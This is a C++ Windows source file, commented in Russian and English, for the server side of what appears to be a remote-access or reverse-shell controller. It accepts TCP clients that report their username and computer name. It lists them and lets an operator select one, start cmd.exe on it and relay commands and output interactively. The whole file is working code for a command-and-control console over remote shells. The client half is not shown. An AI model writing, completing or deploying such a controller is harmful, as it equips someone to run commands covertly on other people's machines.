#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <vector> // Для хранения клиентских сокетов/информации
#include <thread> // Для std::thread
#include <string>       // For std::string
#include <mutex>        // For std::mutex
#include <algorithm>    // For std::remove_if
#include <atomic>       // For std::atomic
#include <iomanip>      // For std::setw, std::left for formatting output
#include <conio.h>      // For _kbhit()
#include <limits>       // For std::numeric_limits (if std::cin.ignore is used)

// Не забываем подключить библиотеку Ws2_32.lib при компиляции
#pragma comment (lib, "Ws2_32.lib")

#include "common.h" // Подключаем наш общий заголовочный файл

struct ClientInfo {
    SOCKET socket;
    int id;
    std::string username;
    std::string computerName;
    std::thread::id threadId;
    // We can add more state here later, e.g., if the client is currently selected
};

std::vector<ClientInfo> connectedClients;
std::mutex clientsMutex;
std::atomic<int> nextClientId(1); // Atomic for thread-safe ID generation
std::atomic<int> selectedClientId(0); // 0 означает, что ни один клиент не выбран

// Forward declaration for the server console input handler
void ServerConsoleInputHandler();
void EnterInteractiveMode(SOCKET clientSocket, int clientId, const std::string& clientIdentifier);

// Функция для обработки каждого клиента в отдельном потоке
void HandleClient(SOCKET clientSocket) {
    char recvbuf[DEFAULT_BUFLEN];
    int recvbuflen = DEFAULT_BUFLEN;
    int iResult;
    int currentClientId = 0;
    std::thread::id thread_id = std::this_thread::get_id(); 
    std::string username_str, computername_str;

    std::cout << "Thread 0x" << std::hex << thread_id << std::dec << ": New client handler started for socket " << clientSocket << std::endl;

    // 1. АУТЕНТИФИКАЦИЯ
    iResult = recv(clientSocket, recvbuf, recvbuflen - 1, 0);
    if (iResult > 0) {
        recvbuf[iResult] = '\0'; 
        username_str = recvbuf;
        std::cout << "Thread 0x" << std::hex << thread_id << std::dec << ": Recv username: '" << username_str << "' (socket " << clientSocket << ")" << std::endl;

        iResult = recv(clientSocket, recvbuf, recvbuflen - 1, 0);
        if (iResult > 0) {
            recvbuf[iResult] = '\0'; 
            computername_str = recvbuf;
            std::cout << "Thread 0x" << std::hex << thread_id << std::dec << ": Recv computer name: '" << computername_str << "' (socket " << clientSocket << ")" << std::endl;

            currentClientId = nextClientId.fetch_add(1);
            {
                std::lock_guard<std::mutex> lock(clientsMutex);
                connectedClients.push_back({clientSocket, currentClientId, username_str, computername_str, thread_id});
            }
            std::cout << "Thread 0x" << std::hex << thread_id << std::dec << ": Client " << currentClientId << " (" << username_str << "@" << computername_str << ") registered. Monitoring connection." << std::endl;

            // 2. ПАССИВНЫЙ МОНИТОРИНГ СОЕДИНЕНИЯ
            // ServerConsoleInputHandler будет напрямую работать с этим сокетом для команд.
            // Этот поток HandleClient только следит за "здоровьем" соединения.
            char dummy_buf[1];
            while (true) {
                fd_set read_fds;
                FD_ZERO(&read_fds);
                FD_SET(clientSocket, &read_fds);
                timeval tv;
                tv.tv_sec = 5; // Проверяем каждые 5 секунд
                tv.tv_usec = 0;

                int select_ret = select(0, &read_fds, NULL, NULL, &tv); // В Windows первый параметр select игнорируется

                if (select_ret == SOCKET_ERROR) {
                    printf("Thread 0x%llx: select() failed for client %d monitoring, error: %d. Assuming disconnect.\n", (unsigned long long)thread_id, currentClientId, WSAGetLastError());
                    break; 
                }
                if (select_ret > 0 && FD_ISSET(clientSocket, &read_fds)) {
                    int peek_ret = recv(clientSocket, dummy_buf, 1, MSG_PEEK);
                    if (peek_ret == 0) { 
                        std::cout << "Thread 0x" << std::hex << thread_id << std::dec << ": Client " << currentClientId << " gracefully disconnected (detected by HandleClient peek)." << std::endl;
                        break;
                    } else if (peek_ret == SOCKET_ERROR) {
                         int error = WSAGetLastError();
                         if (error != WSAEWOULDBLOCK) { 
                            printf("Thread 0x%llx: recv(MSG_PEEK) failed for client %d, error: %d. Assuming disconnect.\n", (unsigned long long)thread_id, currentClientId, error);
                            break;
                         }
                         // WSAEWOULDBLOCK здесь маловероятен с select, но оставляем проверку
                    }
                    // Если peek_ret > 0, значит есть данные, но HandleClient их не читает.
                    // Это нормально, т.к. их должен читать ServerConsoleInputHandler.
                }
                // Если select_ret == 0 (таймаут), значит за 5 секунд ничего не произошло, продолжаем мониторинг.
            }

        } else if (iResult == 0) { 
            printf("Thread 0x%llx: Connection closed by peer during auth (computer name) on socket %llu.\n", (unsigned long long)thread_id, clientSocket);
        } else { 
            printf("Thread 0x%llx: recv for computer name failed with error: %d on socket %llu.\n", (unsigned long long)thread_id, WSAGetLastError(), clientSocket);
        }
    } else if (iResult == 0) { 
        printf("Thread 0x%llx: Connection closed by peer during auth (username) on socket %llu.\n", (unsigned long long)thread_id, clientSocket);
    } else { 
        printf("Thread 0x%llx: recv for username failed with error: %d on socket %llu.\n", (unsigned long long)thread_id, WSAGetLastError(), clientSocket);
    }

    // 3. ДЕРЕГИСТРАЦИЯ И ЗАКРЫТИЕ
    if (currentClientId != 0) {
        bool clientWasSelected = false;
        if (selectedClientId.load() == currentClientId) {
            clientWasSelected = true;
        }
        {
            std::lock_guard<std::mutex> lock(clientsMutex);
            auto& clients = connectedClients; 
            clients.erase(std::remove_if(clients.begin(), clients.end(),
                                    [currentClientId](const ClientInfo& ci) { return ci.id == currentClientId; }),
                          clients.end());
        }
        if (clientWasSelected) {
            std::cout << "Thread 0x" << std::hex << thread_id << std::dec << ": Monitored client " << currentClientId << " (which was selected) disconnected. Clearing server-side selection." << std::endl;
            selectedClientId.store(0); 
        }
        std::cout << "Thread 0x" << std::hex << thread_id << std::dec << ": Client " << currentClientId << " unregistered from monitoring." << std::endl;
    }

    std::cout << "Thread 0x" << std::hex << thread_id << std::dec << ": Shutting down client socket " << clientSocket << " from HandleClient." << std::endl;
    shutdown(clientSocket, SD_BOTH); 
    closesocket(clientSocket);
    std::cout << "Thread 0x" << std::hex << thread_id << std::dec << ": Client socket " << clientSocket << " closed by HandleClient." << std::endl;
}

void ServerConsoleInputHandler() {
    std::string command_str;
    std::cout << "Server Console: Type 'help' for commands." << std::endl;
    while (true) {
        std::cout << "server";
        int current_id_display = selectedClientId.load();
        std::string client_display_str;
        if (current_id_display != 0) {
            // Check if the currently selected client is still connected
            // This is a simplified check. In a real scenario, EnterInteractiveMode 
            // or HandleClient would update selectedClientId upon disconnect.
            bool still_exists = false;
            std::string temp_user, temp_comp;
            {
                std::lock_guard<std::mutex> lock(clientsMutex);
                for (const auto& c : connectedClients) {
                    if (c.id == current_id_display) {
                        still_exists = true;
                        temp_user = c.username;
                        temp_comp = c.computerName;
                        break;
                    }
                }
            }
            if (still_exists) {
                 client_display_str = "[Interactive mode with client " + std::to_string(current_id_display) + " (" + temp_user + "@" + temp_comp + ")]";
                 std::cout << client_display_str;
            } else {
                // If client disconnected while selected, selectedClientId should have been cleared by HandleClient or EnterInteractiveMode.
                // If we reach here, it means selection is stale. Clear it.
                std::cout << "[Selected client " << current_id_display << " no longer connected. Deselecting.]"; 
                selectedClientId.store(0); 
            }
        }
        std::cout << "> ";
        std::getline(std::cin, command_str);

        if (std::cin.eof() || std::cin.bad()) { 
            std::cout << "Console input EOF/error. Exiting console handler." << std::endl; 
            break; 
        }

        if (command_str == "help") {
            std::cout << "Available commands:\n"
                      << "  list          - List connected clients\n"
                      << "  select <id>   - Connect to client <id> and start interactive cmd.exe session\n"
                      << "  deselect      - Deselect current client (if selection is stuck or to return to menu)\n"
                      << "  exit          - Shutdown the server console handler (server listener continues)\n"
                      << "NOTE: In interactive mode, type '~~~exit' to close client's cmd.exe and return here.\n";
        } else if (command_str == "list") {
            std::lock_guard<std::mutex> lock(clientsMutex);
            if (connectedClients.empty()) {
                std::cout << "No clients connected." << std::endl;
            } else {
                std::cout << "Connected clients:\n";
                std::cout << std::left << std::setw(5) << "ID"
                          << std::setw(20) << "Username"
                          << std::setw(25) << "Computer Name"
                          << std::setw(10) << "Socket" 
                          << "Thread ID\n";
                std::cout << std::string(80, '-') << std::endl;
                for (const auto& client : connectedClients) {
                    std::cout << std::left << std::setw(5) << client.id
                              << std::setw(20) << client.username
                              << std::setw(25) << client.computerName
                              << std::setw(10) << client.socket
                              << "0x" << std::hex << client.threadId << std::dec << "\n";
                }
            }
        } else if (command_str.rfind("select ", 0) == 0 && command_str.length() > 7) {
            try {
                int id_to_select = std::stoi(command_str.substr(7));
                SOCKET targetSocket = INVALID_SOCKET;
                std::string clientIdentifier;
                bool found = false;
                {
                    std::lock_guard<std::mutex> lock(clientsMutex);
                    for (const auto& client : connectedClients) {
                        if (client.id == id_to_select) {
                            targetSocket = client.socket;
                            clientIdentifier = client.username + "@" + client.computerName + " (ID: " + std::to_string(client.id) + ")";
                            found = true;
                            break;
                        }
                    }
                }

                if (found) {
                    selectedClientId.store(id_to_select); // Mark as selected *before* entering interactive mode
                    std::cout << "Client " << id_to_select << " selected. Attempting to start interactive cmd.exe session..." << std::endl;
                    
                    std::string shell_name = "cmd.exe"; // Hardcoded to cmd.exe
                    std::string start_shell_cmd = "START_INTERACTIVE_SHELL:" + shell_name;
                    int sendResult = send(targetSocket, start_shell_cmd.c_str(), start_shell_cmd.length() + 1, 0);

                    if (sendResult == SOCKET_ERROR) {
                        printf("Send START_INTERACTIVE_SHELL to client %d failed: %d.\n", id_to_select, WSAGetLastError());
                        selectedClientId.store(0); // Deselect on failure to start
                        continue;
                    }
                    std::cout << "Server: Sent '" << start_shell_cmd << "' to client " << id_to_select << ". Entering interactive mode..." << std::endl;
                    std::cout << "Type '~~~exit' in this console to attempt to close the client's shell and return to server console." << std::endl;
                    
                    EnterInteractiveMode(targetSocket, id_to_select, clientIdentifier);
                    // After EnterInteractiveMode returns, the session is over.
                    // selectedClientId might have been cleared by EnterInteractiveMode or HandleClient if a disconnect occurred.
                    // If not (e.g. normal exit via ~~~exit), we might want to clear it here to signify end of session explicitly,
                    // or let the prompt logic handle it. If still selected, it will show.
                    std::cout << "Server: Returned from interactive mode with client " << id_to_select << "." << std::endl;

                } else {
                    std::cout << "Client with ID " << id_to_select << " not found." << std::endl;
                }
            } catch (const std::invalid_argument& ia) {
                std::cout << "Invalid ID format for select: " << ia.what() << std::endl;
            } catch (const std::out_of_range& oor) {
                std::cout << "ID for select is out of range: " << oor.what() << std::endl;
            }
        } else if (command_str == "deselect") {
            int deselected_id = selectedClientId.load();
            if (deselected_id != 0) {
                selectedClientId.store(0);
                std::cout << "Client " << deselected_id << " deselected. No client is currently active for commands." << std::endl;
            } else {
                std::cout << "No client is currently selected." << std::endl;
            }
        } else if (command_str == "exit") {
            std::cout << "Exiting server console input handler. Server listener thread is still running." << std::endl;
            break; 
        } else if (command_str.empty()) {
            // Skip empty command
        }
        else {
            std::cout << "Unknown command: '" << command_str << "'. Type 'help'." << std::endl;
        }
    }
}

void EnterInteractiveMode(SOCKET clientSocket, int clientId, const std::string& clientIdentifier) {
    std::cout << "--- INTERACTIVE SHELL with " << clientIdentifier << " ---" << std::endl;
    std::string line_to_send;
    char recvbuf_interactive[DEFAULT_BUFLEN];
    const std::string interactive_eof_marker = "\n--INTERACTIVE_EOF--\n";
    const std::string interactive_error_eof_marker = "\n--INTERACTIVE_ERROR_EOF--\n"; // From client StartInteractiveShellAndRelay (CreateProcess fail)
    const std::string interactive_thread_error_eof_marker = "\n--INTERACTIVE_THREAD_ERROR_EOF--\n"; // From client StartInteractiveShellAndRelay (thread create fail)
    // Client might also send generic CMD_EOF if it has an issue with the START_INTERACTIVE_SHELL command itself (e.g. empty shell name)
    const std::string cmd_eof_marker_from_client_error = "\n--CMD_EOF--\n"; 

    bool keep_interactive_session = true;

    u_long original_blocking_mode_val;
    bool original_mode_retrieved = false;
    // Get current blocking mode to restore it later
    // This is not standard, ioctlsocket with FIONBIO is Winsock specific.
    // A portable way is fcntl with O_NONBLOCK on POSIX.
    // For Winsock, we can assume it's blocking by default unless changed.
    // However, to be robust, we should query and restore.
    // For simplicity, we'll assume we set it to non-blocking and then back to blocking (0).

    u_long mode = 1; // 1 to enable non-blocking socket
    if (ioctlsocket(clientSocket, FIONBIO, &mode) != NO_ERROR) {
        std::cerr << "[Server Interactive] Error setting socket to non-blocking: " << WSAGetLastError() << ". Cannot enter interactive mode." << std::endl;
        return; 
    }

    HANDLE hConsoleInput = GetStdHandle(STD_INPUT_HANDLE);
    // No changes to console mode for now, relying on `~~~exit` typed by admin.

    // std::cout << "(shell) " << clientIdentifier << "> "; // Initial prompt for interactive mode. Client shell should provide its own.

    while (keep_interactive_session) {
        // 1. Check for console input from server admin
        // Using _kbhit() and std::getline is a bit of a mix of blocking/non-blocking for console.
        // _kbhit() is non-blocking. std::getline() is blocking.
        // This means if a key is pressed, we then block on getline until Enter.
        if (_kbhit()) { 
            std::getline(std::cin, line_to_send);

            if (std::cin.eof() || std::cin.bad()) {
                std::cout << "[Server Interactive] Server console input error/EOF. Exiting interactive mode." << std::endl;
                keep_interactive_session = false; // Should also signal client to terminate its shell?
                break;
            }

            if (line_to_send == "~~~exit") {
                std::cout << "[Server Interactive] '~~~exit' command typed. Sending 'exit\r\n' to client's shell." << std::endl;
                std::string exit_cmd_for_shell = "exit\r\n"; 
                int send_res = send(clientSocket, exit_cmd_for_shell.c_str(), exit_cmd_for_shell.length(), 0);
                if (send_res == SOCKET_ERROR) {
                     printf("[Server Interactive] Send 'exit' to client %d shell failed: %d. Exiting interactive mode locally.\n", clientId, WSAGetLastError());
                     keep_interactive_session = false; // Exit server side, client might still be running shell
                }
                // We will now wait for the client to send INTERACTIVE_EOF or for a disconnect/timeout.
                // continue; // Don't break yet, let the recv part handle client's reaction
            } else {
                line_to_send += "\n"; // Shells usually expect newline-terminated commands
                int bytesSent = send(clientSocket, line_to_send.c_str(), line_to_send.length(), 0);
                if (bytesSent == SOCKET_ERROR) {
                    printf("[Server Interactive] Send to client %d failed: %d. Exiting interactive mode.\n", clientId, WSAGetLastError());
                    keep_interactive_session = false;
                    break;
                }
            }
        }

        // 2. Check for data from client socket
        int bytesReceived = recv(clientSocket, recvbuf_interactive, DEFAULT_BUFLEN - 1, 0);
        if (bytesReceived > 0) {
            // recvbuf_interactive[bytesReceived] = '\0'; // Null-terminate for string operations if needed.
                                                     // However, client might send binary data or non-null-terminated strings.
                                                     // Best to use the length `bytesReceived`.
            std::string received_data_str(recvbuf_interactive, bytesReceived);
            
            bool eof_detected = false;
            std::string remaining_data = received_data_str;

            size_t pos;
            if ((pos = received_data_str.find(interactive_eof_marker)) != std::string::npos) {
                std::cout << "\n[Server Interactive] Received INTERACTIVE_EOF from client " << clientId << ". Shell session ended." << std::endl;
                remaining_data = received_data_str.substr(0, pos);
                eof_detected = true;
            } else if ((pos = received_data_str.find(interactive_error_eof_marker)) != std::string::npos) {
                std::cout << "\n[Server Interactive] Received INTERACTIVE_ERROR_EOF from client " << clientId << ". Client failed to start shell." << std::endl;
                remaining_data = received_data_str.substr(0, pos);
                eof_detected = true;
            } else if ((pos = received_data_str.find(interactive_thread_error_eof_marker)) != std::string::npos) {
                std::cout << "\n[Server Interactive] Received INTERACTIVE_THREAD_ERROR_EOF from client " << clientId << ". Client relay thread failure." << std::endl;
                remaining_data = received_data_str.substr(0, pos);
                eof_detected = true;
            } else if ((pos = received_data_str.find(cmd_eof_marker_from_client_error)) != std::string::npos && 
                       received_data_str.find("Client Error: Empty shell name") != std::string::npos) {
                 std::cout << "\n[Server Interactive] Received CMD_EOF with error from client " << clientId << " (likely empty shell name)." << std::endl;
                 remaining_data = received_data_str.substr(0, pos);
                 eof_detected = true;
            }

            if (!remaining_data.empty()) {
                std::cout.write(remaining_data.c_str(), remaining_data.length());
                std::cout.flush(); 
            }

            if (eof_detected) {
                keep_interactive_session = false;
                // break; // Exit while loop immediately
            }

        } else if (bytesReceived == 0) {
            std::cout << "\n[Server Interactive] Client " << clientId << " disconnected (recv returned 0). Exiting interactive mode." << std::endl;
            keep_interactive_session = false;
            // break; // Exit while loop
        } else { // SOCKET_ERROR
            int error = WSAGetLastError();
            if (error == WSAEWOULDBLOCK) {
                // No data received, this is normal for non-blocking socket.
                // Add a small sleep to prevent busy-waiting and give CPU to other tasks.
                Sleep(20); // Sleep for 20 milliseconds
            } else {
                printf("\n[Server Interactive] Recv from client %d failed: %d. Exiting interactive mode.\n", clientId, error);
                keep_interactive_session = false;
                // break; // Exit while loop
            }
        }
        // If keep_interactive_session became false, loop will terminate.
    }

    // Restore socket to blocking mode (assuming it was originally blocking)
    mode = 0; // 0 to disable non-blocking socket (enable blocking)
    if (ioctlsocket(clientSocket, FIONBIO, &mode) != NO_ERROR) {
        std::cerr << "[Server Interactive] Error restoring socket to blocking mode for client " << clientId << ": " << WSAGetLastError() << std::endl;
    }

    std::cout << "--- END INTERACTIVE SHELL with " << clientIdentifier << " ---" << std::endl;
    // If std::cin was used with getline, and if there was partial input not consumed because _kbhit() was 
    // checked before a full line was entered, that partial input might remain in std::cin's buffer.
    // For robust handling, after a mixed non-blocking check (_kbhit) and blocking read (getline),
    // it might be necessary to clear std::cin's error flags and ignore remaining buffer content.
    // e.g., if (std::cin.fail()) { std::cin.clear(); std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n'); }
}

int main(void) {
    WSADATA wsaData;
    int iResult;

    SOCKET ListenSocket = INVALID_SOCKET;

    struct addrinfo *result_addr = NULL;
    struct addrinfo hints;

    iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        return 1;
    }
    std::cout << "Server: Winsock initialized." << std::endl;

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;

    iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, &result_addr);
    if ( iResult != 0 ) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return 1;
    }
    std::cout << "Server: Address info obtained." << std::endl;

    ListenSocket = socket(result_addr->ai_family, result_addr->ai_socktype, result_addr->ai_protocol);
    if (ListenSocket == INVALID_SOCKET) {
        printf("socket failed with error: %ld\n", WSAGetLastError());
        freeaddrinfo(result_addr);
        WSACleanup();
        return 1;
    }
    std::cout << "Server: Listen socket created." << std::endl;

    iResult = bind( ListenSocket, result_addr->ai_addr, (int)result_addr->ai_addrlen);
    if (iResult == SOCKET_ERROR) {
        printf("bind failed with error: %d\n", WSAGetLastError());
        freeaddrinfo(result_addr);
        closesocket(ListenSocket);
        WSACleanup();
        return 1;
    }
    std::cout << "Server: Socket bound to port " << DEFAULT_PORT << std::endl;

    freeaddrinfo(result_addr);

    iResult = listen(ListenSocket, SOMAXCONN); 
    if (iResult == SOCKET_ERROR) {
        printf("listen failed with error: %d\n", WSAGetLastError());
        closesocket(ListenSocket);
        WSACleanup();
        return 1;
    }
    std::cout << "Server: Listening on port " << DEFAULT_PORT << "..." << std::endl;
    std::cout << "Server: Waiting for client connections... (Press Ctrl+C to stop listener or use 'exit' in console handler)" << std::endl;

    std::thread serverInputThread(ServerConsoleInputHandler);

    while (true) { 
        SOCKET clientSock; 
        struct sockaddr_storage client_addr_info; 
        socklen_t client_addr_info_size = sizeof(client_addr_info);
        
        clientSock = accept(ListenSocket, (struct sockaddr *)&client_addr_info, &client_addr_info_size);

        if (clientSock == INVALID_SOCKET) {
            // Check if the error is because the listening socket was closed
            // This can happen if another part of the program decided to shut down the server
            // For example, after WSACleanup() or closesocket(ListenSocket) is called elsewhere.
            // Common error codes for this situation are WSAEINTR (if interrupted by a signal/APC)
            // or WSAENOTSOCK (if the socket descriptor is no longer valid).
            // WSAEINVAL if socket not listening.
            int acceptError = WSAGetLastError();
            printf("accept failed with error: %d. Server continuing to listen.\n", acceptError);
            if (acceptError == WSAEINTR || acceptError == WSAENOTSOCK || acceptError == WSAEINVAL) { 
                 std::cout << "Server: accept() failed critically (error: " << acceptError << "), listener loop will terminate." << std::endl;
                 break; 
            }
            continue; 
        }

        char clientHost[NI_MAXHOST];
        char clientService[NI_MAXSERV];
        if (getnameinfo((struct sockaddr *)&client_addr_info, client_addr_info_size,
                        clientHost, NI_MAXHOST,
                        clientService, NI_MAXSERV, NI_NUMERICHOST | NI_NUMERICSERV) == 0) {
            std::cout << "Server: Accepted connection from " << clientHost << ":" << clientService
                      << " on new socket " << clientSock << std::endl;
        } else {
            printf("Server: Accepted connection from unknown client on new socket %llu (getnameinfo error %d)\n", clientSock, WSAGetLastError());
        }
        
        std::thread clientThread(HandleClient, clientSock);
        clientThread.detach(); 
    }

    std::cout << "Server: Listener loop finished." << std::endl;
    
    std::cout << "Server: Signaling console input handler to exit (please type 'exit' if it doesn't close automatically)..." << std::endl;
    // To properly close the console handler, we'd need a shared flag or condition variable.
    // For now, user might need to type 'exit'. If std::cin is closed by server shutting down, getline might fail.

    if (serverInputThread.joinable()) {
        // serverInputThread.join(); // This will hang if 'exit' is not typed in the console handler.
                                  // Or if std::cin is problematic after main thread changes.
                                  // A robust shutdown needs more work.
        std::cout << "Server: Console input thread has been joined or was already finished." << std::endl; 
    }


    std::cout << "Server: Shutting down listener socket..." << std::endl;
    closesocket(ListenSocket); // Close the main listening socket
    WSACleanup();
    std::cout << "Server: Winsock cleaned up. Server exiting." << std::endl;
    return 0;
} 